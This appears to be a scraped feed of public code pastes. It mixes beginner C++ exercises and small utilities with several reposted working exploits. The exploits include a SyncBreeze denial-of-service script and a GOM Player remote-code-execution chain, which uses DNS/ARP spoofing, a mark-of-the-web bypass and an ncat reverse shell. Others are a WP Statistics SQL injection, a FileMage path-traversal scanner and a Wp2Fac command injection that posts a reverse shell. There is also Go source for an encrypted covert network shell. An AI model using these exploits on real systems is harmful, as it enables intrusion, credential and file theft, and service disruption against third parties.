            cout << ""Заменяй "" << ost << "" на "" << phi << ""-"" << e << ""*"" << c << ""\n"";
        };

        phi = ost;
        swap(phi, e);
    }
}

int main() {
    ll first;
    cout << ""1=Расшифровать, 2=Зашифровать? >> "";
    cin >> first;
    ll N, e;
    cout << ""N, e (через пробел)? >> "";
    cin >> N >> e;
    if (first == 1) {
        ll q, p = 1;
        while (true) {
            p += 1;
            if (N%p==0) {
                q = N/p;
                break;
            }
        }
        ll phi = (p-1)*(q-1);
        find_d(e, phi);
        ll d=0;
        while (e*d%phi != 1) {
            cout << ""У тебя должно получиться 1="" << e << ""*u+"" << phi << ""*v. Введи u? >> "";
            cin >> d;
        }
        cout << ""Верно! 🍻"";
        ll tests;
        cout << ""Кол-во данных? >> "";
        cin >> tests;
        while (tests--) {
            ll open;
            cout << ""Введи зашифрованные данные? >> "";
            cin >> open;
            decrypt(d, open, N);
            cout << ""\n"";
        }
    }
    else if (first == 2) {
        ll tests;
        cout << ""Кол-во данных? >> "";
        cin >> tests;
        while (tests--) {
            ll secret;
            cout << ""Введи данные которые нужно зашифровать ? >> "";
            cin >> secret;
            encrypt(e, secret, N);
            cout << ""\n"";
        }
    }
    else {
        cout << ""Неверный ввод"";
    }
}"
3rHjEukB,Untitled,Josif_tepe,C++,Saturday 20th of January 2024 06:07:38 AM CDT,"#include <iostream>
using namespace std;

int main() {
    int a, b;
    cin >> a;
    cin >> b;
    char c;
    cin >> c;
    
    if(c == '+') {
        cout << a + b << endl;
    }
    else if(c == '-') {
        cout << a - b << endl;
    }
    else if(c == '*') {
        cout << a * b << endl;
    }
    else {
        cout << a / b << endl;
    }
    return 0;
}
"
Pmnwawjs,SyncBreeze 15.2.24 - 'login' Denial of Service,FlyFar,Python,Saturday 20th of January 2024 06:07:19 AM CDT,"# Exploit Title: SyncBreeze 15.2.24 -'login' Denial of Service
# Date: 30/08/2023
# Exploit Author: Mohamed Youssef
# Vendor Homepage: https://www.syncbreeze.com/
# Software Link: https://www.syncbreeze.com/setups/syncbreeze_setup_v15.4.32.exe
# Version: 15.2.24
# Tested on: windows 10 64-bit
import socket
import time


pyload=""username=admin&password=""+'password='*500+""""
request=""""
request+=""POST /login HTTP/1.1\r\n""
request+=""Host: 192.168.217.135\r\n""
request+=""User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0\r\n""
request+=""Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8\r\n""
request+=""Accept-Language: en-US,en;q=0.5\r\n""
request+=""Accept-Encoding: gzip, deflate\r\n""
request+=""Content-Type: application/x-www-form-urlencoded\r\n""
request+=""Content-Length: ""+str(len(pyload))+""\r\n""
request+=""Origin: http://192.168.217.135\r\n""
request+=""Connection: keep-alive\r\n""
request+=""Referer: http://192.168.217.135/login\r\n""
request+=""Upgrade-Insecure-Requests: 1\r\n""
request+=""\r\n""
request+=pyload

print (request)
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect((""192.168.217.135"",80))
s.send(request.encode())
print (s.recv(1024))
s.close()
time.sleep(5)
            "
dqDp5HTF,Untitled,Josif_tepe,C++,Saturday 20th of January 2024 06:05:14 AM CDT,"#include <iostream>
using namespace std;

int main() {
   
    int a, b;
    cin >> a;
    cin >> b;
    
    if(a == 0 and b == 0) {
        cout << ""ima beskonecno resenija"" << endl;
    }
    else if(a == 0 and b != 0) {
        cout << ""nema resenie"" << endl;
    }
    else {
        cout << -b/a << endl;
    }
    return 0;
}
"
0yZ6W49E,Untitled,Josif_tepe,C++,Saturday 20th of January 2024 06:01:57 AM CDT,"#include <iostream>
using namespace std;

int main() {
   
    int a, b, c;
    cin >> a;
    cin >> b;
    cin >> c;
    
    if(a <= b and a <= c) {
        cout << a << endl;
        if(b <= c) {
            cout << b << endl;
            cout << c << endl;
        }
        else {
            cout << c << endl;
            cout << b << endl;
        }
    }
    else if(b <= a and b <= c) {
        cout << b << endl;
        if(a <= c) {
            cout << a << endl;
            cout << c << endl;
        }
        else {
            cout << c << endl;
            cout << a << endl;
        }
    }
    else {
        cout << c << endl;
        if(a <= b) {
            cout << a << endl;
            cout << b << endl;
        }
        else {
            cout << b << endl;
            cout << a << endl;
        }
    }
    return 0;
}
"
wTpcw2Lp,data817,TestGuy1,JSON,Saturday 20th of January 2024 06:00:07 AM CDT,"{
  status: 'Success',
  method: 'server',
  maindata: '9f0d841f681df7e49e42a6d21049e5c95a156da36ee204038c9a92f9913d5930a6f9cd4247200c039223d637f6f2c8a3e3ab5b19afe5a19a2cbf3b62b1bfe51fe7a60c91c6d688b37bcc69664eabc643985a647bfb98e5df6a23bd104727522ab8de7de426f21b42b518a918c397322b69f89e3c0c3e20fd0a79c71c13efd5bc',
  otherdata: [
    'c9ed17ff638bd5abdf0ffdb66f2b87a5',
    '1fbc3562ebabf74464ca42ed7df636b2',
    'bd951c59c468200ee2c02f3aa7fb9737',
    '7a6ccf07a04ad8eaa62ae3e5b5aeadea',
    'f00be90640e072dd09cf5bf88e4b7d71',
    '9b4efa69531b43913dba46f49b444ea6',
    'e29ae2bde340e81bccad3dba7f920fdc',
    'afe3815c0e63d72132dc18c76eea4f4f'
  ]
}"
zaryw2AY,IP LookUP,ngatmuri,PHP,Saturday 20th of January 2024 05:56:15 AM CDT,"<?php 
    // persiapkan curl
    $ch = curl_init(); 

    // set url 
    curl_setopt($ch, CURLOPT_URL, ""http://dynupdate.no-ip.com/ip.php"");

    // return the transfer as a string 
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); 

    // $output contains the output string 
    $output = curl_exec($ch); 

    // tutup curl 
    curl_close($ch);      

    // menampilkan hasil curl
    echo $output;
?>"
Arh4yZin,Untitled,Josif_tepe,C++,Saturday 20th of January 2024 05:53:38 AM CDT,"#include <iostream>
using namespace std;

int main() {
   
    int x;
    cin >> x;
    
    if(x % 2 == 0) {
        cout << ""PAREN"" << endl;
    }
    else {
        cout << ""NEPAREN"" << endl;
    }
    
    return 0;
}
"
p4pAi4Pr,Untitled,Josif_tepe,C++,Saturday 20th of January 2024 05:52:10 AM CDT,"#include <iostream>
using namespace std;

int main() {
   
    int a, b, c;
    cin >> a;
    cin >> b;
    cin >> c;
    
    if(a + b > c and a + c > b and b + c > a) {
        cout << ""DA"" << endl;
    }
    else {
        cout << ""NE"" << endl;
    }
    
    return 0;
}
"
5vb1vbpq,GOM Player 2.3.90.5360 - Remote Code Execution (RCE),FlyFar,Python,Saturday 20th of January 2024 05:49:44 AM CDT,"# Exploit Title: GOM Player 2.3.90.5360 - Remote Code Execution (RCE)
# Date: 26.08.2023
# Author: M. Akil Gündoğan
# Contact: https://twitter.com/akilgundogan
# Vendor Homepage: https://www.gomlab.com/gomplayer-media-player/
# Software Link: https://cdn.gomlab.com/gretech/player/GOMPLAYERGLOBALSETUP_NEW.EXE
# Version: 2.3.90.5360 
# Tested on: Windows 10 Pro x64 22H2 19045.3324
# PoC Video: https://www.youtube.com/watch?v=8d0YUpdPzp8

# Impacts: GOM player has been downloaded 63,952,102 times according to CNET. It is used by millions of people worldwide.

# Vulnerability Description: 
# The IE component in the GOM Player's interface uses an insecure HTTP connection. Since IE is vulnerable to the 
# SMB/WebDAV+ ""search-ms"" technique, we can redirect the victim to the page we created with DNS spoofing and execute code on the target.
# In addition, the URL+ZIP+VBS MoTW bypass technique was used to prevent the victim from seeing any warning in the pop-up window. 

# Full disclosure, developers should be more careful about software security.

# Exploit Usage: Run it and enter the IP address of the target. Then specify the port to listen to for the reverse shell.

# Some spaghetti and a bad code but it works :)

banner = """"""\033[38;5;196m+-----------------------------------------------------------+
|     GOM Player 2.3.90.5360 - Remote Code Execution        |
|   Test edildi, sinifta kaldi. Bu oyun hic bitmeyecek :-)  |
+-----------------------------------------------------------+\033[0m"""""" +"""""" 
\033[38;5;117m[*]- Author: M. Akil Gundogan - rootkit.com.tr\n\033[0m""""""

import time,os,zipfile,subprocess,socket,sys

print(banner)

if os.geteuid() != 0:
    print(""You need root privileges to run the exploit, please use sudo..."")
    sys.exit(1)

targetIP = input(""- Target IP address: "")
listenPort = input(""- Listening port for Reverse Shell: "")

def fCreate(fileName,fileContent): # File create func. 
    f = open(fileName,""w"")
    f.write(fileContent)
    f.close()    

gw = os.popen(""ip -4 route show default"").read().split()
s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
s.connect((gw[2], 0))
ipaddr = s.getsockname()[0]
gateway = gw[2]
host = socket.gethostname()
print (""- My IP:"", ipaddr, "" Gateway:"", gateway, "" Host:"", host) 

print(""\n[*]- Stage 1: Downloading neccesary tools..."")

smbFolderName = ""GomUpdater"" # change this (optional)
expWorkDir = ""gomExploitDir"" # change this (optional)
os.system(""mkdir "" + expWorkDir +"" >/dev/null 2>&1 &"") # Creating a working directory for the exploit.
time.sleep(1) # It's necessary for exploit stability. 
os.system(""cd "" + expWorkDir + ""&& mkdir smb-shared web-shared >/dev/null 2>&1 &"") # Creating a working directory for the exploit.
time.sleep(1) # It's necessary for exploit stability. 
os.system(""cd "" + expWorkDir + ""/smb-shared && wget https://nmap.org/dist/ncat-portable-5.59BETA1.zip >/dev/null 2>&1 && unzip -o -j ncat-portable-5.59BETA1.zip >/dev/null 2>&1 && rm -rf ncat-portable-5.59BETA1.zip README"") #Downloading ncat
print(""    [*] - Ncat has been downloaded."")
subprocess.run(""git clone https://github.com/fortra/impacket.git "" + expWorkDir + ""/impacket >/dev/null 2>&1"",shell=True) # Downloading Impacket
print(""    [*] - Impacket has been downloaded."")
subprocess.run(""git clone https://github.com/dtrecherel/DNSSpoof.git "" + expWorkDir + ""/dnsspoof >/dev/null 2>&1"",shell=True) # Downloading DNSSpoof.py
print(""    [*] - DNSSpoof.py has been downloaded."")

print(""[*]- Stage 2: Creating Attacker SMB Server..."")
subprocess.Popen(""cd gomExploitDir/impacket/examples && python3 smbserver.py ""+smbFolderName+"" ../../smb-shared -smb2support >/dev/null 2>&1"",shell=True) # Running SMB server.
time.sleep(5) # It's necessary for exploit stability. 

smbIP = ipaddr
spoofUrl = ""playinfo.gomlab.com"" # Web page that causes vulnerability because it is used as HTTP

print(""[*]- Stage 3: Creating Attacker Web Page..."")

# change this (optional) 
screenExpPage = """"""
<meta charset=""utf-8"">
<script> window.alert(""GOM Player için acil güncelleme yapılmalı ! Açılan pencerede lütfen updater'a tıklayın."");</script> 
<script>window.location.href= 'search-ms:displayname=GOM Player Updater&crumb=System.Generic.String%3AUpdater&crumb=location:%5C%5C""""""+smbIP+""""""';
</script>
""""""

fCreate(expWorkDir + ""/web-shared/screen.html"",screenExpPage)
time.sleep(3) # It's necessary for exploit stability. 

print(""[*]- Stage 4: Creating URL+VBS for MoTW bypass placing it into the ZIP archive..."")
vbsCommand = '''Set shell=CreateObject(""wscript.shell"") 
Shell.Run(""xcopy /y \\\\yogurt\\ayran\\ncat.exe %temp%"")
WScript.Sleep 5000
Shell.Run(""cmd /c start /min cmd /c %temp%\\ncat.exe attackerIP attackerPort -e cmd"")''' # change this (optional)
vbsCommand = vbsCommand.replace(""yogurt"", smbIP).replace(""ayran"", smbFolderName).replace(""attackerIP"",smbIP).replace(""attackerPort"",listenPort)
fCreate(expWorkDir + ""/payload.vbs"",vbsCommand)

urlShortcut = '''[InternetShortcut]
URL=file://'''+smbIP+""/""+smbFolderName+'''/archive.zip/payload.vbs
IDlist='''
fCreate(expWorkDir + ""/smb-shared/Updater.url"",urlShortcut)
time.sleep(3) # It's necessary for exploit stability. 
zipName = expWorkDir + ""/smb-shared/archive.zip""
payload_filename = os.path.join(expWorkDir, ""payload.vbs"")  

with zipfile.ZipFile(zipName, ""w"") as malzip:
    malzip.write(payload_filename, arcname=os.path.basename(payload_filename))

print(""[*]- Stage 5: Running the attacker's web server..."")
subprocess.Popen(""cd "" + expWorkDir + ""/web-shared && python3 -m http.server 80 >/dev/null 2>&1"",shell=True) # Running attacker web server with Python mini http.server
time.sleep(3) # It's necessary for exploit stability. 

print(""[*]- Stage 6: Performing DNS and ARP spoofing for the target..."")
subprocess.Popen(""python3 "" + expWorkDir + ""/dnsspoof/dnsspoof.py -d "" + spoofUrl + "" -t "" + targetIP + "">/dev/null 2>&1"",shell=True) # DNS Spoofing...
time.sleep(10) # It's neccesary for exploit stability.
os.system(""ping -c 5 "" + targetIP + "" >/dev/null 2>&1 &"") # Ping the target... 
os.system(""arping -c 5 "" + targetIP + "" >/dev/null 2>&1 &"") # ARPing the target.
print(""[*]- Stage 7: Waiting for the target to open GOM Player and execute the malicious URL shortcut...\n"")
subprocess.run(""nc -lvnp "" + listenPort,shell=True)
subprocess.run(""pkill -f smbserver.py & pkill -f http.server & pkill -f dnsspoof.py"",shell=True) # Closing background processes after exploitation...
            "
MyERBEg5,Untitled,Josif_tepe,C++,Saturday 20th of January 2024 05:49:19 AM CDT,"#include <iostream>
using namespace std;

int main() {
   
    int mesec;
    cin >> mesec;
    
    if(mesec == 2) {
        cout << 28 << endl;
    }
    else if(mesec == 1 or mesec == 3 or mesec == 5 or mesec == 7 or mesec == 8 or mesec == 10 or mesec == 12) {
        cout << 31 << endl;
    }
    else {
        cout << 30 << endl;
    }
    
    
    return 0;
}
"
s3M9uP8n,WP Statistics Plugin 13.1.5 current_page_id - Time based SQL injection - CVE-2022-25148,FlyFar,Python,Saturday 20th of January 2024 05:47:31 AM CDT,"# Exploit Title: WP Statistics Plugin <= 13.1.5 current_page_id - Time based SQL injection (Unauthenticated)
# Date: 13/02/2022
# Exploit Author: psychoSherlock
# Vendor Homepage: https://wp-statistics.com/
# Software Link: https://downloads.wordpress.org/plugin/wp-statistics.13.1.5.zip
# Version: 13.1.5 and prior
# Tested on: wp-statistics 13.1.5
# CVE : CVE-2022-25148
# Vendor URL: https://wordpress.org/plugins/wp-statistics/
# CVSS Score: 8.4 (High)

import argparse
import requests
import re
import urllib.parse


def main():
    parser = argparse.ArgumentParser(description=""CVE-2022-25148"")
    parser.add_argument('-u', '--url', required=True,
                        help='Wordpress base URL')

    args = parser.parse_args()

    baseUrl = args.url
    payload = ""IF(1=1, sleep(5), 1)""

    wp_session = requests.session()

    resp = wp_session.get(baseUrl)
    nonce = re.search(r'_wpnonce=(.*?)&wp_statistics_hit', resp.text).group(1)
    print(f""Gathered Nonce: {nonce}"")

    headers = {
        ""User-Agent"": ""Mozilla/5.0 (Macintosh; Intel Mac OS X 12_2_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.2 Safari/605.1.15""}

    payload = urllib.parse.quote_plus(payload)
    exploit = f'/wp-json/wp-statistics/v2/hit?_=11&_wpnonce={nonce}&wp_statistics_hit_rest=&browser=&platform=&version=&referred=&ip=11.11.11.11&exclusion_match=no&exclusion_reason&ua=Something&track_all=1&timestamp=11&current_page_type=home&current_page_id={payload}&search_query&page_uri=/&user_id=0'
    exploit_url = baseUrl + exploit

    print(f'\nSending: {exploit_url}')

    resp = wp_session.get(exploit_url, headers=headers)

    if float(resp.elapsed.total_seconds()) >= 5.0:
        print(""\n!!! Target is vulnerable !!!"")
        print(f'\nTime taken: {resp.elapsed.total_seconds()}')
    else:
        print('Target is not vulnerable')


if __name__ == ""__main__"":
    main()
            "
CRqznmDr,Untitled,Josif_tepe,C++,Saturday 20th of January 2024 05:47:13 AM CDT,"#include <iostream>
using namespace std;

int main() {
    int x;
    cin >> x;
    
    
    if(x < 10) {
        cout << ""pomalo od 10"" << endl;
    }
    else if(x % 2 == 0) {
        cout << ""paren"" << endl;
    }
    else {
        cout << ""nisto od ova ne e tocno"" << endl;
    }
    
    
    
    return 0;
}
"
1FZjHM4X,sh_par_test.sh,FranzVuttke,Bash,Saturday 20th of January 2024 05:46:38 AM CDT,"#!/bin/bash
echo $#
echo ${#3}

"
A0rj6pkS,FileMage Gateway 1.10.9 - Local File Inclusion - CVE-2023-39026,FlyFar,Python,Saturday 20th of January 2024 05:45:36 AM CDT,"# Exploit Title: FileMage Gateway 1.10.9 - Local File Inclusion
# Date: 8/22/2023
# Exploit Author: Bryce ""Raindayzz"" Harty   
# Vendor Homepage: https://www.filemage.io/
# Version: Azure Versions < 1.10.9
# Tested on: All Azure deployments < 1.10.9 
# CVE : CVE-2023-39026

# Technical Blog - https://raindayzz.com/technicalblog/2023/08/20/FileMage-Vulnerability.html
# Patch from vendor - https://www.filemage.io/docs/updates.html

import requests
import warnings
warnings.filterwarnings(""ignore"")
def worker(url):
    response = requests.get(url, verify=False, timeout=.5)
    return response
def main():
    listIP = []
    file_path = input(""Enter the path to the file containing the IP addresses: "")
    with open(file_path, 'r') as file:
        ip_list = file.read().splitlines()
        searchString = ""tls""
        for ip in ip_list:
            url = f""https://{ip}"" + ""/mgmnt/..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5cprogramdata%5cfilemage%5cgateway%5cconfig.yaml""
            try:
                response = worker(url)
                #print(response.text)
                if searchString in response.text:
                    print(""Vulnerable IP: "" + ip)
                    print(response.text)
                    listIP.append(ip)
            except requests.exceptions.RequestException as e:  
                print(f""Error occurred for {ip}: {str(e)}"")

    for x in listIP:
        print(x)
if __name__ == '__main__':
    main()
            "
rSmw0qqT,mnt_other_distro.sh,FranzVuttke,Bash,Saturday 20th of January 2024 05:43:50 AM CDT,"#!/bin/bash

#
# created by OuNiS 01.2024
# doc: https://www.facebook.com/groups/linux.fans.group/posts/24685486807733102/?__cft__[0]=AZUTsgKEF5DlRDSGTYGu6kjYsJdS1Lm090Z2B_T9TvBJ7bon4XQSI6fhNqqZByoGYbtProsYei1SNUQ_Mgl2PuKyDlDXbVRRc4wDqGnNXk6jZEDPaw1qTSQ7O6f3MdhzBqpMYbPNebHreHdqHXotmcN-&__tn__=%2CO%2CP-R
#
sudo mkdir /mnt/distro
sudo mount /dev/sda2 /mnt/distro


"
HgYSx4ib,Untitled,Josif_tepe,C++,Saturday 20th of January 2024 05:42:56 AM CDT,"#include <iostream>
using namespace std;

int main() {
    int x;
    cin >> x;
    
    if(x < 10) {
        cout << ""Pomal od 10"" << endl;
    }
    else if(x > 10) {
        cout << ""Pogolemo od 10"" << endl;
    }
    else if(x % 2 == 0) {
        cout << ""PAREN"" << endl;
    }
    
    
    if(x % 2 == 1) {
        cout << ""NEPAREN"" << endl;
    }
    else if(x % 2 == 0) {
        cout << ""PAREN"" << endl;
    }
    
    
    
    return 0;
}
"
cvR02C9H,Wp2Fac - OS Command Injection,FlyFar,Python,Saturday 20th of January 2024 05:41:02 AM CDT,"# Exploit Title: Wp2Fac v1.0 - OS Command Injection
# Date: 2023-08-27
# Exploit Author: Ahmet Ümit BAYRAM
# Vendor: https://github.com/metinyesil/wp2fac
# Tested on: Kali Linux & Windows 11
# CVE: N/A

import requests

def send_post_request(host, revshell):
    url = f'http://{host}/send.php'
    headers = {
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:102.0)
Gecko/20100101 Firefox/102.0',
        'Accept': '*/*',
        'Accept-Language': 'en-US,en;q=0.5',
        'Accept-Encoding': 'gzip, deflate',
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'X-Requested-With': 'XMLHttpRequest',
        'Origin': f'http://{host}',
        'Connection': 'close',
        'Referer': f'http://{host}/',
    }

    data = {
        'numara': f'1234567890 & {revshell} &;'
    }

    response = requests.post(url, headers=headers, data=data)
    return response.text

host = input(""Target IP: "")

revshell = input(""Reverse Shell Command: "")

print(""Check your listener!"")

send_post_request(host, revshell)
            "
2XZRnMTt,Untitled,Josif_tepe,C++,Saturday 20th of January 2024 05:35:54 AM CDT,"#include <iostream>
using namespace std;

int main() {
    int a, b;
    cin >> a >> b;
    
    if(a > b and a % 2 == 0) {
        cout << ""DA"" << endl;
    }
    
    return 0;
}
"
GEKh59Rk,Untitled,Josif_tepe,C++,Saturday 20th of January 2024 05:30:06 AM CDT,"#include <iostream>
using namespace std;

int main() {
    int mesec;
    cin >> mesec;
    
    if(mesec == 2) {
        cout << 28 << endl;
    }
    
    if(mesec == 1 or mesec == 3 or mesec == 5 or mesec == 7 or mesec == 8 or mesec == 10 or mesec == 12) {
        cout << 31 << endl;
    }
    if(mesec == 4 or mesec == 6 or mesec == 9 or mesec == 11) {
        cout << 30 << endl;
    }
    
    return 0;
}
"
0brLthRD,Untitled,Josif_tepe,C++,Saturday 20th of January 2024 05:27:10 AM CDT,"#include <iostream>
using namespace std;

int main() {
    int a, b;
    cin >> a;
    cin >> b;
    
    if(a > b or b % 2 == 1) {
        cout << ""DA"" << endl;
    }
    
    
    return 0;
}
"
2P4u5ppD,Untitled,35657,C++,Saturday 20th of January 2024 05:25:13 AM CDT,"#define _CRT_SECURE_NO_WARNINGS

#include <iostream>
#include <Windows.h> // нужна для работы SetConsole

using namespace std;

void InsertChar(char* str, char ch, int num) {
	num--;
	for (int i = strlen(str) + 1; i > num; i--) {
		str[i] = str[i - 1];
	}
	str[num] = ch;
}

int main() {

	SetConsoleCP(1251); // установка кодировки 1251 в поток ввода 
	SetConsoleOutputCP(1251); // установка кодировки 1251 в поток вывода (то же, что setlocale)

	char line[40];
	char ch;
	int num;

	cout << ""Введите строку: "";
	gets_s(line);
	cout << ""Введите символ: "";
	cin >> ch;
	cout << ""Введите позиция: "";
	cin >> num;
	InsertChar(line, ch, num);
	cout << line << endl;
	
}"
FRqc55Hs,shell.go,FlyFar,Go,Saturday 20th of January 2024 05:24:42 AM CDT,"package main

/*
 * shell.go
 * Hook up the network to a shell
 * By J. Stuart McMurray
 * Created 0160226
 * Last Modified 0160226
 */

import (
	""bufio""
	""io""
	""log""
	""net""
	""os""
	""os/exec""
	""runtime""
)

func shell(c *net.IPConn, name string) {
	/* Get keys */
	skey, rkey := readShellKeys()
	for {
		/* Get a shell */
		shell, stdin, stdout, stderr := makeShell(name)
		/* Start the copies */
		ec := make(chan error, 4)
		go send(c, stdout, skey, ec)
		go send(c, stderr, skey, ec)
		go recv(stdin, c, rkey, ec)
		/* Start the shell */
		if err := shell.Start(); nil != err {
			log.Fatalf(""Cannot start shell: %v"", err)
		}
		log.Printf(""Ready %v <-> %v"", c.LocalAddr(), c.RemoteAddr())
		go func() {
			ec <- shell.Wait()
		}()

		/* Wait for something to happen */
		err := <-ec
		shell.Process.Kill()
		stdin.Close()
		stdout.Close()
		stderr.Close()
		if nil != err && io.EOF != err {
			log.Printf(""Error: %v"", err)
		} else {
			log.Printf(""Done."")
		}
	}
}

/* makeShell makes a shell named n, and returns the shell and it's i/o. */
func makeShell(n string) (
	shell *exec.Cmd,
	stdin io.WriteCloser,
	stdout io.ReadCloser,
	stderr io.ReadCloser,
) {
	if ""windows"" == runtime.GOOS {
		log.Fatalf(""Windows is not supported.  Please submit a patch."")
	}
	/* Make a shell */
	shell = exec.Command(""/bin/sh"")
	/* Set the binary as /bin/sh */
	shell.Path = ""/bin/sh""
	/* Name it something shady */
	shell.Args = []string{n}
	/* Get i/o */
	stdin, stdout, stderr = pipes(shell)
	return
}

/* pipes gets the i/o pipes for c, or calls log.Fatalf if it can't */
func pipes(cmd *exec.Cmd) (stdin io.WriteCloser, stdout, stderr io.ReadCloser) {
	var err error
	/* Get stdio */
	stdin, err = cmd.StdinPipe()
	if nil != err {
		log.Fatalf(""Cannot get stdin: %v"", err)
	}
	stdout, err = cmd.StdoutPipe()
	if nil != err {
		log.Fatalf(""Cannot get stdout: %v"", err)
	}
	stderr, err = cmd.StderrPipe()
	if nil != err {
		log.Fatalf(""Cannot get stderr: %v"", err)
	}
	return
}

/* readShellKeys gets two keys (send, receive) from stdin. */
func readShellKeys() (skey, rkey [KEYLEN]byte) {
	r := bufio.NewReader(os.Stdin)
	skey = getKey(r)
	rkey = getKey(r)
	return
}"
LL85isU9,sender.go,FlyFar,Go,Saturday 20th of January 2024 05:24:05 AM CDT,"package main

/*
 * sender.go
 * Send encrypted data to the network
 * By J. Stuart McMurray
 * Created 20160226
 * Last Modified 20160226
 */

import (
	""crypto/rand""
	""io""
	""log""
	""net""

	""golang.org/x/crypto/nacl/secretbox""
)

/* send sends messages from in to out, encrypting them with the key.  If there
is an error, it will be sent to ec. */
func send(out *net.IPConn, in io.Reader, key [KEYLEN]byte, ec chan<- error) {
	if err := xmit(out, in, key, roll); nil != err {
		ec <- err
	}
	ec <- nil
}

/* roll encrypts a message, and prepends the nonce, puts it in buf, and
returns buf. */
func roll(buf, msg []byte, key [KEYLEN]byte) ([]byte, error) {
	/* Reset buffer */
	buf = buf[0:0]
	/* Get a nonce */
	n := nonce()
	/* Put it at the beginning of the message to send */
	for _, v := range n {
		buf = append(buf, v)
	}
	/* Encrypt the message */
	return secretbox.Seal(buf, msg, &n, &key), nil
}

/* nonce returns a nonce.  The nonce returned will be different for each call
to nonce. */
func nonce() [NONCELEN]byte {
	snoncebuf := make([]byte, NONCELEN)
	var n [NONCELEN]byte
	/* Read random bytes */
	_, err := rand.Read(snoncebuf)
	if nil != err {
		log.Fatalf(""Rand read: %v"", err)
	}
	/* Populate into an array */
	for i, v := range snoncebuf {
		n[i] = v
	}
	return n
}"
Lrryywpy,receiver.go,FlyFar,Go,Saturday 20th of January 2024 05:23:32 AM CDT,"package main

/*
 * receiver.go
 * Receive data from the network, unpack/unencrypt it
 * By J. Stuart McMurray
 * Created 20160226
 * Last Modified 20160226
 */

import (
	""fmt""
	""io""
	""net""

	""golang.org/x/crypto/nacl/secretbox""
)

const (
	IP4HLEN = 20 /* IPv4 Header Length */
	IP6HLEN = 40 /* IPv6 Header Length */
)

/* recv receives packets from in, decrypts them, and sends to out.  If there
is an error, it will be sent to ec. */
func recv(out io.Writer, in *net.IPConn, key [KEYLEN]byte, ec chan<- error) {
	if err := xmit(out, in, key, unroll); nil != err {
		ec <- err
	}
	ec <- nil
}

/* unroll takes the packet in msg, chops off the IP header, decrypts the
packet, puts the plaintext in buf, and returns buf.  Non-fatal errors will
cause a log message to be printed, but no error will be returned. */
func unroll(buf, msg []byte, key [KEYLEN]byte) ([]byte, error) {
	buf = buf[0:0]
	/* Get the nonce and ciphertext */
	nonce, msg, err := splitPacket(msg)
	if nil != err {
		return buf, err
	}
	ok := false
	buf, ok = secretbox.Open(buf, msg, &nonce, &key)
	if !ok {
		return buf, fmt.Errorf(""decrypt failed"")
	}
	return buf, nil
}

/* splitPacket returns the nonce and payload from a packet. */
func splitPacket(msg []byte) (
	nonce [NONCELEN]byte,
	payload []byte,
	err error,
) {
	/* Remove the header */
	msg, err = chopHeader(msg)
	if nil != err {
		return nonce, msg, err
	}

	/* If there's no bytes left, it's probably a heartbeet */
	if 0 == len(msg) {
		return nonce, msg, HeartBeetError
	}

	/* Pull off the nonce */
	if NONCELEN > len(msg) {
		return nonce, msg, fmt.Errorf(
			""packet body too small for nonce: %02X"",
			msg,
		)
	}
	for i, _ := range nonce {
		nonce[i] = msg[i]
	}

	/* The rest is the payload */
	payload = msg[NONCELEN:]

	return nonce, payload, err
}

/* chopHeader reslices pkt to remove the IP header. */
func chopHeader(pkt []byte) ([]byte, error) {
	/* Switch by IP version */
	switch (pkt[0] & 0xF0) >> 4 {
	case 4:
		if IP4HLEN > len(pkt) {
			return pkt, fmt.Errorf(
				""message too small (<%v bytes)"",
				IP4HLEN,
			)
		}
		pkt = pkt[IP4HLEN:]
	case 6:
		if IP6HLEN > len(pkt) {
			return pkt, fmt.Errorf(
				""message too small (<%v bytes)"",
				IP6HLEN,
			)
		}
		pkt = pkt[IP6HLEN:]
	default:
		return pkt, fmt.Errorf(
			""unknown IP version: %02X"",
			pkt,
		)
	}
	return pkt, nil
}"
HkSL5ii7,net.go,FlyFar,Go,Saturday 20th of January 2024 05:22:55 AM CDT,"package main

/*
 * net.go
 * Network functions
 * By J. Stuart McMurray
 * Created 20160226
 * Last Modified 20160226
 */

import (
	""fmt""
	""io""
	""log""
	""net""
	""time""
)

var HeartBeetError = fmt.Errorf(""heartbeet"")

/* localIP gets a local IP address for the host, or 127.0.0.1 if nothing else
works */
func localIP() (string, error) {
	/* Local addresses */
	addrs, err := net.InterfaceAddrs()
	if nil != err {
		return ""127.0.0.1"", err
	}
	/* Find the first non-loopback address */
	for _, v := range addrs {
		/* Cast to something we can use */
		i, ok := v.(*net.IPNet)
		if !ok {
			log.Printf(""Found strange address: %v"", v)
			continue
		}
		/* Only get external addresses */
		if !i.IP.IsGlobalUnicast() {
			continue
		}
		return i.IP.String(), nil
	}
	return ""127.0.0.1"", nil
}

/* resolve resolves addresses to addresses or dies */
func resolve(a string) *net.IPAddr {
	i, err := net.ResolveIPAddr(""ip"", a)
	if nil != err {
		log.Fatalf(""Resolve: %v"", err)
	}
	return i
}

/* xmit copies bytes from in to out, passing them through crypt in the process.
If there is an error, it will be sent to ec. */
func xmit(
	out io.Writer,
	in io.Reader,
	key [KEYLEN]byte,
	crypt func(buf, msg []byte, key [KEYLEN]byte) ([]byte, error),
) error {
	var (
		pbuf = make([]byte, BUFLEN) /* Plaintext Buffer */
		cbuf = make([]byte, BUFLEN) /* Ciphertext buffer */
		rerr error                  /* Read error */
		werr error                  /* Write error */
		cerr error                  /* Encryption error */
		n    int                    /* Read length */
	)
	for {
		/* Reset buffer */
		pbuf = pbuf[0:cap(pbuf)]

		/* Read a bit */
		n, rerr = in.Read(pbuf)
		/* Trim unused space */
		pbuf = pbuf[:n]

		/* If we didn't read anything, try again if there's no error */
		if 0 == n {
			/* If there's an error, give up */
			if nil != rerr {
				return rerr
			}
			log.Printf(""Heartbeet?"") /* DEBUG */
		}

		/* Crypt and send the message */
		cbuf, cerr = crypt(cbuf, pbuf, key)
		if nil != cerr {
			if HeartBeetError != cerr {
				log.Printf(""Crypt: %v"", cerr)
			}
			continue
		}
		_, werr = out.Write(cbuf)

		/* If either read or write errored, give up */
